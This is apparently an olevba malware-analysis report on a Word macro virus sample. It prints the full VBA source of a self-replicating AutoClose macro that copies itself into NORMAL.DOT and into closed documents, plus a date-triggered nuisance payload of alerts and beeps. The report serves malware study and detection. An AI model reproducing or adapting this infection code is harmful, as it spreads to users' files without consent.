olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv.f-137c5deeb5907c85112572b8b485b3d0a5b3136a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv.f-137c5deeb5907c85112572b8b485b3d0a5b3136a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Dmv.f-137c5deeb5907c85112572b8b485b3d0a5b3136a - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'*********************************************************************'
'* Macro Name: Autoclose                                   *'
'* Date Authored: January 5, 1997                          *'
'* Strain: Macro.WinWord.Loophole.1                        *'
'* Function: To detect, and alert Supervisors of security loopholes  *'
'*           by representing a dangerous DMV, and providing them with*'
'*           valuable insight to the nature of macro Virii         *'
'* Author: PuP                                             *'
'*********************************************************************'
Public Sub MAIN()
Dim head$
Dim m$
Dim havefriends
Dim cycle
Dim a$
Dim copied
Dim logic
Dim d$
Dim tdate
Dim rand
Dim beeps
head$ = "Macro Virus Security Loophole"
m$ = "Hey there! This is an inert "
m$ = m$ + "macro virus.  It is the direct result of the neglagence of"
m$ = m$ + " your supervisor.  Please ask him/her to tighten up "
m$ = m$ + "security, because this could have been a killer, "
m$ = m$ + "and ruined your file(s)!"
m$ = m$ + Chr(13) + "                           -Pup"

' Check and see if the AutoClose macro is installed in global.
If WordBasic.CountWindows() <> 0 Then
havefriends = 0
For cycle = 1 To WordBasic.CountMacros(0)
    If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
        havefriends = 1
    End If
Next cycle

' Get the current document name.
If WordBasic.[Left$](WordBasic.[WindowName$](), 8) <> "Document" Then
    a$ = WordBasic.[WindowName$]() + ":AutoClose"
End If

' If AutoClose isn't present, then copy it to NORMAL.DOT.
If havefriends = 0 Then
    ' The following code infects a document each time it is closed.
    ' This effectively spreads the macro virus each time an infected
    ' document is opened by Word.
    WordBasic.MacroCopy a$, "Global:AutoClose", 1
    copied = 1

Else
    ' If AutoClose is already global and the file hasn't been
    ' infected yet, save the current file as a
    ' template instead of a document so the macro can be attached.
    ' See if AutoClose is already in the document.  Don't need
    ' to check names because the virus would be the only code
    ' putting a macro in a document.

    havefriends = 0
    If WordBasic.CountMacros(1) <> 0 Then
        havefriends = 1
    End If
    If havefriends = 0 Then
        ' Save the document as a template.
        WordBasic.FileSaveAs Format:=1
        ' Then copy the AutoClose macro from NORMAL.DOT.
        If a$ <> "" Then WordBasic.MacroCopy "Global:AutoClose", a$, 1
        copied = 1
    End If
End If
    ' This is the payload that made you aware of this security loop hole
    logic = 970125
    d$ = WordBasic.[Date$]()
    tdate = WordBasic.Val(WordBasic.[Right$](d$, 2) + WordBasic.[Left$](d$, 2) + Mid(d$, 4, 2))
    If copied > 0 And logic <= tdate Then
            rand = WordBasic.Int(Rnd() * 49) + 1
            If rand Mod 10 = 0 Then
                WordBasic.Beep
                WordBasic.MsgBox m$, head$, 16
            ElseIf rand Mod 31 = 0 Then
                WordBasic.MsgBox "This computer will self destruct in 5 minutes", head$, 16
                WordBasic.WaitCursor 1
                For beeps = 1 To 150
                    WordBasic.Beep
                Next beeps
            End If
    End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

